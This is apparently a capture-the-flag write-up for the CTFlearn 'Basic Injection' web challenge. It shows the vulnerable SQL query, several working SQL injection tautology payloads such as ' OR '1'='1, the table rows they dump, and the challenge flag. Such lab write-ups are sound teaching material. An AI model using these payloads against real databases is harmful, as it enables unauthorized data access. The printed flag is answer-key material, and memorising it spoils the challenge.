
# Basic Injection 

We want to use a basic SQL Injection payload on an insecure page, as the challenge name suggests

### Step-1: The Launch 

We have to open the given URL https://web.ctflearn.com/web4/

### Step-2: Inspection

We always want to check all possible elements on a webpage by simply clicking on them. Viewing the page source is also one of the first things to do.

Comment found in the code: ```<!-- Try some names like Hiroki, Noah, Luke --> ```

### Step-3: Injection

Given names won't help you in finishing the challenge. 

We can see the original query to the site's database:```SELECT * FROM webfour.webfour where name = '$input'``` so we know where the attack should be executed.

There is no need to use Brupsuite Intruder to brutforce it. Injection is so simple that we can paste it manually.

You can easily find some examples via Internet

I've tried:

```' OR 'a'='a' -- ```

Bute here are the payloads that also work:

```
' OR ''='
' OR '1'='1
```

We recieve the output:

```
Name: Luke
Data: I made this problem.
Name: Alec
Data: Steam boys.
Name: Jalen
Data: Pump that iron fool.
Name: Eric
Data: I make cars.
Name: Sam
Data: Thinks he knows SQL.
Name: fl4g__giv3r
Data: CTFlearn{th4t_is_why_you_n33d_to_sanitiz3_inputs}
Name: snoutpop
Data: jowls
Name: Chunbucket
Data: @datboiiii
```

### Step-4: Paste The Flag

```
CTFlearn{th4t_is_why_you_n33d_to_sanitiz3_inputs}
```
